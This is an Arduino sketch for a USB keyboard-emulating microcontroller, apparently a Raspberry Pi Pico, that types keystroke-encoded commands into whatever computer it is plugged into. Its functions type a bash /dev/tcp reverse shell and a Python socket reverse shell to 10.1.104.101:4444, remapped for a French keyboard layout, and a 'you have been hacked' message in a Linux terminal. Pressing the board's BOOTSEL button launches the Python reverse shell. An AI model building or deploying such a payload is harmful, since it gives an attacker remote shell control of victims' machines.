#include "Keyboard.h"
#include "Mouse.h"

void openNotepad() {
  Keyboard.write(131); // (Windows)
  delay(1000);
  Keyboard.write(110); // n
  Keyboard.write(111); // o
  Keyboard.write(116); // t
  Keyboard.write(144); // e
  Keyboard.write(155); // p
  Keyboard.write(156); // a
  Keyboard.write(143); // d
  delay(1000);
  Keyboard.write(176);  // \n
}

void openTermLinux() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.write('t');
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(1000);
  Keyboard.write(101);
  Keyboard.write(99);
  Keyboard.write(104);
  Keyboard.write(111);
  Keyboard.write(32);
  Keyboard.write(51);
  Keyboard.write(89);
  Keyboard.write(111);
  Keyboard.write(117);
  Keyboard.write(32);
  Keyboard.write(104);
  Keyboard.write(113);
  Keyboard.write(118);
  Keyboard.write(101);
  Keyboard.write(32);
  Keyboard.write(98);
  Keyboard.write(101);
  Keyboard.write(101);
  Keyboard.write(110);
  Keyboard.write(32);
  Keyboard.write(104);
  Keyboard.write(113);
  Keyboard.write(99);
  Keyboard.write(107);
  Keyboard.write(101);
  Keyboard.write(100);
  Keyboard.write(51);

  Keyboard.write(32);
  Keyboard.write(49);
  Keyboard.write(49);
  Keyboard.write(32);
  
  Keyboard.write(115);
  Keyboard.write(108);
  Keyboard.write(101);
  Keyboard.write(101);
  Keyboard.write(112);
  Keyboard.write(32);
  Keyboard.write(35);
  
  Keyboard.write(32);
  Keyboard.write(49);
  Keyboard.write(49);
  Keyboard.write(32);
  
  Keyboard.write(101);
  Keyboard.write(120);
  Keyboard.write(105);
  Keyboard.write(116);
  
  Keyboard.write(176);
}

void revShell() {
  Keyboard.write(62);     // /
  Keyboard.write(98);     // b
  Keyboard.write(105);    // i
  Keyboard.write(110);    // n
  Keyboard.write(62);     // /
  Keyboard.write(98);     // b
  Keyboard.write(113);    // a
  Keyboard.write(115);    // s
  Keyboard.write(104);    // h
  Keyboard.write(32);     //  
  Keyboard.write(54);     // -
  Keyboard.write(105);    // i
  Keyboard.write(32);     //  
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.write(236);    // < (avec maj => >)
  Keyboard.release(KEY_LEFT_SHIFT);Keyboard.write(49);    // &
  Keyboard.write(32);     //  
  Keyboard.write(62);     // /
  Keyboard.write(100);    // d
  Keyboard.write(101);    // e
  Keyboard.write(118);    // v
  Keyboard.write(62);     // /
  Keyboard.write(116);    // t
  Keyboard.write(99);     // c
  Keyboard.write(112);    // p
  Keyboard.write(62);     // /
  Keyboard.write(33);     // 1
  Keyboard.write(41);     // 0
  Keyboard.write(60);     // .
  Keyboard.write(33);     // 1
  Keyboard.write(60);     // .
  Keyboard.write(33);     // 1
  Keyboard.write(41);     // 0
  Keyboard.write(36);     // 4
  Keyboard.write(60);     // .
  Keyboard.write(33);     // 1
  Keyboard.write(41);     // 0
  Keyboard.write(33);     // 1
  Keyboard.write(62);     // /
  Keyboard.write(36);     // 4
  Keyboard.write(36);     // 4
  Keyboard.write(36);     // 4
  Keyboard.write(36);     // 4
  Keyboard.write(32);     //  
  Keyboard.write(41);     // 0
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.write(236);    // < (avec maj => >)
  Keyboard.release(KEY_LEFT_SHIFT);Keyboard.write(49);    // &
  Keyboard.write(33);     // 1
  Keyboard.write(176);    // 
}

void revShellPython() {
  Keyboard.write(112);    // p
  Keyboard.write(121);    // y
  Keyboard.write(116);    // t
  Keyboard.write(104);    // h
  Keyboard.write(111);    // o
  Keyboard.write(110);    // n
  Keyboard.write(35);     // 3
  Keyboard.write(32);     //  
  Keyboard.write(54);     // -
  Keyboard.write(99);     // c
  Keyboard.write(32);     //  
  Keyboard.write(52);     // '
  Keyboard.write(105);    // i
  Keyboard.write(59);     // m
  Keyboard.write(112);    // p
  Keyboard.write(111);    // o
  Keyboard.write(114);    // r
  Keyboard.write(116);    // t
  Keyboard.write(32);     //  
  Keyboard.write(115);    // s
  Keyboard.write(111);    // o
  Keyboard.write(99);     // c
  Keyboard.write(107);    // k
  Keyboard.write(101);    // e
  Keyboard.write(116);    // t
  Keyboard.write(109);    // ,
  Keyboard.write(115);    // s
  Keyboard.write(117);    // u
  Keyboard.write(98);     // b
  Keyboard.write(112);    // p
  Keyboard.write(114);    // r
  Keyboard.write(111);    // o
  Keyboard.write(99);     // c
  Keyboard.write(101);    // e
  Keyboard.write(115);    // s
  Keyboard.write(115);    // s
  Keyboard.write(109);    // ,
  Keyboard.write(111);    // o
  Keyboard.write(115);    // s
  Keyboard.write(44);     // ;
  Keyboard.write(115);    // s
  Keyboard.write(61);     // =
  Keyboard.write(115);    // s
  Keyboard.write(111);    // o
  Keyboard.write(99);     // c
  Keyboard.write(107);    // k
  Keyboard.write(101);    // e
  Keyboard.write(116);    // t
  Keyboard.write(60);     // .
  Keyboard.write(115);    // s
  Keyboard.write(111);    // o
  Keyboard.write(99);     // c
  Keyboard.write(107);    // k
  Keyboard.write(101);    // e
  Keyboard.write(116);    // t
  Keyboard.write(53);     // (
  Keyboard.write(115);    // s
  Keyboard.write(111);    // o
  Keyboard.write(99);     // c
  Keyboard.write(107);    // k
  Keyboard.write(101);    // e
  Keyboard.write(116);    // t
  Keyboard.write(60);     // .
  Keyboard.write(81);     // A
  Keyboard.write(70);     // F
  Keyboard.write(56);     // _
  Keyboard.write(73);     // I
  Keyboard.write(78);     // N
  Keyboard.write(69);     // E
  Keyboard.write(84);     // T
  Keyboard.write(109);    // ,
  Keyboard.write(115);    // s
  Keyboard.write(111);    // o
  Keyboard.write(99);     // c
  Keyboard.write(107);    // k
  Keyboard.write(101);    // e
  Keyboard.write(116);    // t
  Keyboard.write(60);     // .
  Keyboard.write(83);     // S
  Keyboard.write(79);     // O
  Keyboard.write(67);     // C
  Keyboard.write(75);     // K
  Keyboard.write(56);     // _
  Keyboard.write(83);     // S
  Keyboard.write(84);     // T
  Keyboard.write(82);     // R
  Keyboard.write(69);     // E
  Keyboard.write(81);     // A
  Keyboard.write(58);     // M
  Keyboard.write(45);     // )
  Keyboard.write(44);     // ;
  Keyboard.write(115);    // s
  Keyboard.write(60);     // .
  Keyboard.write(99);     // c
  Keyboard.write(111);    // o
  Keyboard.write(110);    // n
  Keyboard.write(110);    // n
  Keyboard.write(101);    // e
  Keyboard.write(99);     // c
  Keyboard.write(116);    // t
  Keyboard.write(53);     // (
  Keyboard.write(53);     // (
  Keyboard.write(51);     // "
  Keyboard.write(33);     // 1
  Keyboard.write(41);     // 0
  Keyboard.write(60);     // .
  Keyboard.write(33);     // 1
  Keyboard.write(60);     // .
  Keyboard.write(33);     // 1
  Keyboard.write(41);     // 0
  Keyboard.write(36);     // 4
  Keyboard.write(60);     // .
  Keyboard.write(33);     // 1
  Keyboard.write(41);     // 0
  Keyboard.write(33);     // 1
  Keyboard.write(51);     // "
  Keyboard.write(109);    // ,
  Keyboard.write(36);     // 4
  Keyboard.write(36);     // 4
  Keyboard.write(36);     // 4
  Keyboard.write(36);     // 4
  Keyboard.write(45);     // )
  Keyboard.write(45);     // )
  Keyboard.write(44);     // ;
  Keyboard.write(111);    // o
  Keyboard.write(115);    // s
  Keyboard.write(60);     // .
  Keyboard.write(100);    // d
  Keyboard.write(117);    // u
  Keyboard.write(112);    // p
  Keyboard.write(64);     // 2
  Keyboard.write(53);     // (
  Keyboard.write(115);    // s
  Keyboard.write(60);     // .
  Keyboard.write(102);    // f
  Keyboard.write(105);    // i
  Keyboard.write(108);    // l
  Keyboard.write(101);    // e
  Keyboard.write(110);    // n
  Keyboard.write(111);    // o
  Keyboard.write(53);     // (
  Keyboard.write(45);     // )
  Keyboard.write(109);    // ,
  Keyboard.write(41);     // 0
  Keyboard.write(45);     // )
  Keyboard.write(44);     // ;
  Keyboard.write(32);     //  
  Keyboard.write(111);    // o
  Keyboard.write(115);    // s
  Keyboard.write(60);     // .
  Keyboard.write(100);    // d
  Keyboard.write(117);    // u
  Keyboard.write(112);    // p
  Keyboard.write(64);     // 2
  Keyboard.write(53);     // (
  Keyboard.write(115);    // s
  Keyboard.write(60);     // .
  Keyboard.write(102);    // f
  Keyboard.write(105);    // i
  Keyboard.write(108);    // l
  Keyboard.write(101);    // e
  Keyboard.write(110);    // n
  Keyboard.write(111);    // o
  Keyboard.write(53);     // (
  Keyboard.write(45);     // )
  Keyboard.write(109);    // ,
  Keyboard.write(33);     // 1
  Keyboard.write(45);     // )
  Keyboard.write(44);     // ;
  Keyboard.write(111);    // o
  Keyboard.write(115);    // s
  Keyboard.write(60);     // .
  Keyboard.write(100);    // d
  Keyboard.write(117);    // u
  Keyboard.write(112);    // p
  Keyboard.write(64);     // 2
  Keyboard.write(53);     // (
  Keyboard.write(115);    // s
  Keyboard.write(60);     // .
  Keyboard.write(102);    // f
  Keyboard.write(105);    // i
  Keyboard.write(108);    // l
  Keyboard.write(101);    // e
  Keyboard.write(110);    // n
  Keyboard.write(111);    // o
  Keyboard.write(53);     // (
  Keyboard.write(45);     // )
  Keyboard.write(109);    // ,
  Keyboard.write(64);     // 2
  Keyboard.write(45);     // )
  Keyboard.write(44);     // ;
  Keyboard.write(105);    // i
  Keyboard.write(59);     // m
  Keyboard.write(112);    // p
  Keyboard.write(111);    // o
  Keyboard.write(114);    // r
  Keyboard.write(116);    // t
  Keyboard.write(32);     //  
  Keyboard.write(112);    // p
  Keyboard.write(116);    // t
  Keyboard.write(121);    // y
  Keyboard.write(44);     // ;
  Keyboard.write(32);     //  
  Keyboard.write(112);    // p
  Keyboard.write(116);    // t
  Keyboard.write(121);    // y
  Keyboard.write(60);     // .
  Keyboard.write(115);    // s
  Keyboard.write(112);    // p
  Keyboard.write(113);    // a
  Keyboard.write(122);    // w
  Keyboard.write(110);    // n
  Keyboard.write(53);     // (
  Keyboard.write(51);     // "
  Keyboard.write(62);     // /
  Keyboard.write(98);     // b
  Keyboard.write(105);    // i
  Keyboard.write(110);    // n
  Keyboard.write(62);     // /
  Keyboard.write(98);     // b
  Keyboard.write(113);    // a
  Keyboard.write(115);    // s
  Keyboard.write(104);    // h
  Keyboard.write(51);     // "
  Keyboard.write(45);     // )
  Keyboard.write(52);     // '
  Keyboard.write(176);    // 
}

void setup() {
  Keyboard.begin();
  Mouse.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  delay(1000);

  digitalWrite(LED_BUILTIN, HIGH);
}

char brightness = 0;
char inc = 1;

void loop() {
  // set the brightness of pin 9:
  analogWrite(LED_BUILTIN, brightness);

  // change the brightness for next time through the loop:
  brightness += inc;

  // reverse the direction of the fading at the ends of the fade:
  if (brightness == 0 || brightness == 255) {
    inc = -inc;
  }
  // wait for 30 milliseconds to see the dimming effect
  delay(10);

  if (BOOTSEL) {
    revShellPython();
  }
}
